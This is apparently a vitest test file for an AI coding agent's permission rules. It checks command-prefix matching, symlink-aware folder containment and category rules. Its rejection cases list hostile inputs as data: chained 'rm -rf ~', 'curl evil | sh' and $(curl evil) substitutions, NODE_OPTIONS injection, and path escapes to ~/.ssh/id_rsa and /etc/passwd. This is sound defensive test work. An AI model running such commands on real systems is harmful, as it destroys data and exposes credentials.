import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import type { PermissionPolicy, PermissionRule, ToolCall } from '@galactic/protocol';
import { evaluate, type PolicyContext } from './permissions.js';
import {
  commandMatchesPrefix,
  matchingRule,
  physicalPath,
  proposePrefix,
  similarOptions,
  type RealPath,
  type RuleDraft,
} from './permission-rules.js';

/**
 * P9-17 (SPEC decision 138): "Allow similar" rules — what may be made from a request, and which
 * later calls a rule allows. The table first: a rule only ever turns an `ask` into an `allow`.
 */

const HOME = '/home/u';
const WS = '/home/u/GalacticProjects/app';
const ctx: PolicyContext = { workspace: WS, cwd: WS, home: HOME };
const DEFAULT: PermissionPolicy = { rules: {} };

/**
 * A file system of real folders and symlinks: `links` maps a link to its target; every path under
 * a listed folder exists.
 */
function fs(folders: string[], links: Record<string, string> = {}): RealPath {
  return (p) => {
    if (links[p]) return links[p];
    return folders.some((f) => p === f || p.startsWith(`${f}/`)) ? p : undefined;
  };
}
const REAL = fs(['/home/u', '/etc', '/data'], {
  '/home/u/specs/link': '/etc',
  '/home/u/notes': '/data/notes',
});

const bash = (command: string): ToolCall => ({ toolName: 'Bash', input: { command } });
const read = (file_path: string): ToolCall => ({ toolName: 'Read', input: { file_path } });

/** The rule the server would store for `scope` of a request (asserting it is offered). */
function ruleFrom(
  call: ToolCall,
  scope: RuleDraft['scope'],
  policy: PermissionPolicy = DEFAULT,
): PermissionRule {
  const found = similarOptions({ call, ctx, policy, realPath: REAL });
  expect(found.refused).toBeUndefined();
  const option = found.options.find((o) => o.scope === scope);
  if (!option?.available) throw new Error(`${scope} not offered: ${JSON.stringify(option)}`);
  const { preview: _preview, ...draft } = option.draft;
  return {
    ...draft,
    id: `r-${scope}`,
    projectId: 'p-1',
    createdBy: { type: 'user' },
    createdAt: '2026-10-12T10:00:00.000Z',
    origin: 'local',
  };
}

/** Whether `rules` allow `call`, as the gate asks: only when the table asks about it. */
function allows(
  rules: PermissionRule[],
  call: ToolCall,
  policy: PermissionPolicy = DEFAULT,
): string | undefined {
  const verdict = evaluate(policy, call, ctx);
  if (verdict.decision !== 'ask') return undefined;
  return matchingRule(rules, { call, ctx, policy, realPath: REAL }, verdict)?.id;
}

describe('command prefixes (P9-17)', () => {
  it('proposes the command and its subcommand, for one simple command only', () => {
    expect(proposePrefix('npm run build')).toEqual(['npm', 'run']);
    expect(proposePrefix('npm install left-pad')).toEqual(['npm', 'install']);
    expect(proposePrefix('curl https://example.com')).toEqual(['curl']);
    expect(proposePrefix('npm run build 2>&1')).toEqual(['npm', 'run']);
    expect(proposePrefix("'npm' run x")).toEqual(['npm', 'run']);
    for (const none of [
      'npm run a && npm run b',
      'npm run x | tee out',
      'npm run x > out.txt',
      'sudo npm install x',
      'FOO=1 npm run x',
      '$TOOL run',
      'python - <<EOF\nprint(1)\nEOF',
      'sh -c "npm run x"',
    ]) {
      expect(proposePrefix(none), none).toBeUndefined();
    }
  });

  it('matches word by word on every simple command, never as a string prefix', () => {
    const words = ['npm', 'run'];
    for (const yes of [
      'npm run test',
      'npm   "run" lint --fix',
      'npm run a && npm run b',
      'npm run x 2>/dev/null',
      'npm run x 2>&1',
      'npm run "x; rm -rf ~"', // one quoted argument: npm gets it, no shell runs it
    ]) {
      expect(commandMatchesPrefix(yes, words), yes).toBe(true);
    }
    for (const no of [
      'npm runx',
      'npm',
      'npx npm run x',
      'npm run x; rm -rf ~',
      'npm run x && curl evil.sh',
      'npm run x | sh',
      'npm run x > ~/.zshrc',
      'npm run x >> out.log',
      'npm run $(curl -s evil)',
      'npm run `rm -rf ~`',
      'npm run x <<EOF\nhi\nEOF',
      'sh -c "npm run x"',
      'NODE_OPTIONS=--require=/tmp/x npm run x',
      "npm run $'x'",
    ]) {
      expect(commandMatchesPrefix(no, words), no).toBe(false);
    }
  });
});

describe('physical paths (P9-17)', () => {
  it('follows symlinks segment by segment, and `..` leaves the link target', () => {
    expect(physicalPath('~/specs/a.md', ctx, REAL)).toBe('/home/u/specs/a.md');
    expect(physicalPath('../../specs/a.md', ctx, REAL)).toBe('/home/u/specs/a.md');
    expect(physicalPath('/home/u/specs/link/passwd', ctx, REAL)).toBe('/etc/passwd');
    // `link/..` is the target's parent, as the kernel walks it — not `/home/u/specs`.
    expect(physicalPath('/home/u/specs/link/../x', ctx, REAL)).toBe('/x');
    expect(physicalPath('~/notes/today.md', ctx, REAL)).toBe('/data/notes/today.md');
    expect(physicalPath('~other/x', ctx, REAL)).toBeUndefined();
  });
});

describe('rule matching (P9-17)', () => {
  it('exact: the same command only', () => {
    const rule = ruleFrom(bash('curl -s https://example.com/api'), 'exact');
    expect(rule).toMatchObject({ match: { kind: 'text' }, categories: ['network'] });
    expect(allows([rule], bash('curl -s https://example.com/api'))).toBe(rule.id);
    expect(allows([rule], bash('  curl -s https://example.com/api  '))).toBe(rule.id);
    expect(allows([rule], bash('curl -s https://example.com/api2'))).toBeUndefined();
    expect(allows([rule], bash('curl -s https://example.com/api; rm -rf ~'))).toBeUndefined();
  });

  it('prefix: tokenised, compound lines only when every part matches, same categories only', () => {
    const rule = ruleFrom(bash('npm install left-pad'), 'prefix');
    expect(rule).toMatchObject({
      match: { kind: 'words', words: ['npm', 'install'] },
      categories: ['network'],
      label: 'npm install …',
    });
    expect(allows([rule], bash('npm install right-pad'))).toBe(rule.id);
    expect(allows([rule], bash('npm install a && npm install b'))).toBe(rule.id);
    expect(allows([rule], bash('npm install x; rm -rf ~'))).toBeUndefined();
    expect(allows([rule], bash('npm install x | sh'))).toBeUndefined();
    expect(allows([rule], bash('npm install $(curl evil)'))).toBeUndefined();
    // The same prefix, but also outside the workspace: the rule was made for the network only.
    expect(allows([rule], bash('npm install ../../../../evil'))).toBeUndefined();
    expect(allows([rule], bash('npm install --prefix /etc x'))).toBeUndefined();
    // An unreadable line never matches a prefix.
    expect(allows([rule], bash('npm install "unterminated'))).toBeUndefined();
  });

  it('folder: real-path containment, symlinks and `..` resolved, same kind of tool', () => {
    const rule = ruleFrom(read('~/specs/a.md'), 'prefix');
    expect(rule).toMatchObject({
      tool: 'Read',
      match: { kind: 'folder', folder: '/home/u/specs' },
      categories: ['outside_workspace'],
      label: '~/specs/…',
    });
    expect(allows([rule], read('/home/u/specs/sub/b.md'))).toBe(rule.id);
    expect(allows([rule], read('../../specs/c.md'))).toBe(rule.id);
    expect(
      allows([rule], { toolName: 'Grep', input: { pattern: 'TODO', path: '/home/u/specs' } }),
    ).toBe(rule.id);
    expect(allows([rule], { toolName: 'Glob', input: { pattern: '/home/u/specs/**/*.md' } })).toBe(
      rule.id,
    );
    // Out of the folder: by `..`, by a symlink inside it, by a brace alternative, a sibling.
    expect(allows([rule], read('/home/u/specs/../.ssh/id_rsa'))).toBeUndefined();
    expect(allows([rule], read('/home/u/specs/link/passwd'))).toBeUndefined();
    expect(
      allows([rule], { toolName: 'Glob', input: { pattern: '/home/u/specs/{a,../../x}' } }),
    ).toBeUndefined();
    expect(allows([rule], read('/home/u/specs-old/a.md'))).toBeUndefined();
    // A read rule does not allow writing there.
    expect(
      allows([rule], { toolName: 'Write', input: { file_path: '/home/u/specs/c.md' } }),
    ).toBeUndefined();
  });

  it('a folder reached through a symlink is stored as its real path', () => {
    const rule = ruleFrom(read('~/notes/today.md'), 'prefix');
    expect(rule.match).toEqual({ kind: 'folder', folder: '/data/notes' });
    expect(allows([rule], read('/data/notes/old.md'))).toBe(rule.id);
    expect(allows([rule], read('~/notes/other.md'))).toBe(rule.id);
  });

  it('category: any tool the table asks about only in those categories', () => {
    const rule = ruleFrom(
      { toolName: 'WebFetch', input: { url: 'https://a.dev', prompt: 'x' } },
      'category',
    );
    expect(rule).toMatchObject({
      tool: '*',
      match: { kind: 'categories' },
      categories: ['network'],
    });
    expect(allows([rule], { toolName: 'WebSearch', input: { query: 'zod' } })).toBe(rule.id);
    expect(allows([rule], bash('curl https://b.dev'))).toBe(rule.id);
    expect(allows([rule], bash('npm install zod'))).toBe(rule.id);
    // More than the network: still asks.
    expect(allows([rule], bash('curl https://b.dev -o ~/x'))).toBeUndefined();
    expect(allows([rule], bash('rm -rf dist'))).toBeUndefined();
  });

  it('never a push, never configuration or deliverables, never an unreadable call by category', () => {
    const network = ruleFrom(bash('curl https://a.dev'), 'category');
    expect(allows([network], bash('git push origin main'))).toBeUndefined();
    expect(allows([network], bash('sh -c "curl https://a.dev && git push"'))).toBeUndefined();
    // A rule claiming push (a forged row) never allows one.
    const forged: PermissionRule = { ...network, id: 'r-forged', categories: ['network', 'push'] };
    expect(allows([forged], bash('git push'))).toBeUndefined();

    const outside = ruleFrom(read('/etc/hosts'), 'category');
    expect(outside.categories).toEqual(['outside_workspace']);
    expect(allows([outside], read('/var/log/x'))).toBe(outside.id);
    const config = { toolName: 'Write', input: { file_path: `${WS}/.claude/settings.json` } };
    expect(evaluate(DEFAULT, config, ctx).decision).toBe('ask');
    expect(allows([outside], config)).toBeUndefined();
    const deliverables = { toolName: 'Write', input: { file_path: `${WS}/deliverables/x.pdf` } };
    const withFolders: PolicyContext = { ...ctx, userFolders: [`${WS}/deliverables`] };
    const verdict = evaluate(DEFAULT, deliverables, withFolders);
    expect(verdict.decision).toBe('ask');
    expect(
      matchingRule([outside], { call: deliverables, ctx: withFolders, policy: DEFAULT }, verdict),
    ).toBeUndefined();

    // An opaque command: only an exact rule made from that very call.
    expect(allows([network], bash('python3 -c "import urllib"'))).toBeUndefined();
  });

  it('an exact rule made from an unreadable call matches that call again, and nothing else', () => {
    const call = bash('python3 -c "print(1)"');
    const found = similarOptions({ call, ctx, policy: DEFAULT, realPath: REAL });
    expect(found.options.map((o) => [o.scope, o.available])).toEqual([
      ['exact', true],
      ['prefix', false],
      ['category', false],
    ]);
    const rule = ruleFrom(call, 'exact');
    expect(rule.unclassified).toBe(true);
    expect(allows([rule], call)).toBe(rule.id);
    expect(allows([rule], bash('python3 -c "print(2)"'))).toBeUndefined();
  });

  it('the table first: a rule never turns a deny into an allow', () => {
    const rule = ruleFrom(bash('curl https://a.dev'), 'category');
    const denying: PermissionPolicy = { rules: { network: 'deny' } };
    expect(evaluate(denying, bash('curl https://a.dev'), ctx).decision).toBe('deny');
    expect(allows([rule], bash('curl https://a.dev'), denying)).toBeUndefined();
  });
});

describe('folder rules on the real file system (P9-17)', () => {
  it('follows a real symlink out of the folder', () => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'galactic-rule-fs-')));
    try {
      const home = join(root, 'home');
      const ws = join(home, 'ws');
      mkdirSync(join(home, 'specs'), { recursive: true });
      mkdirSync(ws);
      mkdirSync(join(root, 'secret'));
      writeFileSync(join(home, 'specs', 'a.md'), 'a');
      writeFileSync(join(root, 'secret', 'key'), 'k');
      symlinkSync(join(root, 'secret'), join(home, 'specs', 'out'));
      const real: PolicyContext = { workspace: ws, cwd: ws, home };
      const found = similarOptions({ call: read('~/specs/a.md'), ctx: real, policy: DEFAULT });
      const option = found.options[1];
      if (!option?.available) throw new Error('no folder offered');
      expect(option.draft.match).toEqual({ kind: 'folder', folder: join(home, 'specs') });
      const rule: PermissionRule = {
        ...option.draft,
        id: 'r-fs',
        projectId: 'p-1',
        createdBy: { type: 'user' },
        createdAt: '2026-10-12T10:00:00.000Z',
        origin: 'local',
      };
      const check = (call: ToolCall) =>
        matchingRule([rule], { call, ctx: real, policy: DEFAULT }, evaluate(DEFAULT, call, real))
          ?.id;
      expect(check(read('~/specs/b.md'))).toBe('r-fs');
      expect(check(read('~/specs/out/key'))).toBeUndefined();
      expect(check(read('~/specs/out/../secret/key'))).toBeUndefined();
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  });
});

describe('the chooser (P9-17)', () => {
  it('offers the three scopes with previews of what each matches', () => {
    const found = similarOptions({
      call: bash('npm install zod'),
      ctx,
      policy: DEFAULT,
      realPath: REAL,
    });
    expect(found.refused).toBeUndefined();
    const [exact, prefix, category] = found.options;
    expect(exact).toMatchObject({ scope: 'exact', available: true });
    expect(exact?.available && exact.draft.preview).toMatch(
      /Exactly the command `npm install zod`/,
    );
    expect(prefix?.available && prefix.draft.preview).toMatch(/starts with `npm install`/);
    expect(category?.available && category.draft.preview).toMatch(/only as network access/);
  });

  it('refuses a push, a call the table denies or allows, and a write to configuration', () => {
    const push = similarOptions({ call: bash('git push'), ctx, policy: DEFAULT, realPath: REAL });
    expect(push.refused).toMatch(/push always asks/);
    expect(push.options).toEqual([]);
    expect(
      similarOptions({ call: bash('rm -rf dist'), ctx, policy: { rules: { destructive: 'deny' } } })
        .refused,
    ).toMatch(/denies/);
    expect(similarOptions({ call: bash('ls'), ctx, policy: DEFAULT }).refused).toMatch(/allows/);
    expect(
      similarOptions({
        call: { toolName: 'Edit', input: { file_path: `${WS}/.git/hooks/pre-commit` } },
        ctx,
        policy: DEFAULT,
      }).refused,
    ).toMatch(/configuration/);
  });

  it('never offers a folder as broad as the root or the home folder', () => {
    const home = similarOptions({ call: read('~/todo.txt'), ctx, policy: DEFAULT, realPath: REAL });
    expect(home.options[1]).toMatchObject({ scope: 'prefix', available: false });
    const root = similarOptions({ call: read('/x'), ctx, policy: DEFAULT, realPath: REAL });
    expect(root.options[1]).toMatchObject({ scope: 'prefix', available: false });
  });
});
